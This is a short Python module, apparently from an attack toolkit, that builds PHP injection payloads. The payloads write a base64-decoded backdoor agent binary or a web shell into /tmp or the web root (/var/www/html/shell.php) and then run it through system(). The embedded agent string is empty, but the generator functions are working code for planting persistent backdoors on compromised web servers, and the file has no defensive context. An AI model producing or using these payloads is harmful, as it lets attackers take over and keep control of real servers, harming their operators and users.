#!/usr/bin/env python3
# -*- coding: utf-8 -*-


# <?php echo base64_encode(file_get_contents('./bda'));
BackdoorAgent = """"""


def exp_upload_bin(path="", data=""):
    return "file_put_contents('%s',base64_decode('%s'));system('%s -s');" % (path, data, path)


def exp_upload_bin_backdoor(path=""):
    return exp_upload_bin(path, BackdoorAgent)


def exp_upload_bin_backdoor_tmp():
    return exp_upload_bin_backdoor("/tmp/bdatmp")


def exp_upload_bin_backdoor_www():
    return exp_upload_bin_backdoor("/var/www/html/bdawww")


def exp_upload_shell(path="/var/www/html/shell.php", data="test"):
    return "file_put_contents('%s',base64_decode('%s'));system('php %s');" % (path, data, path)
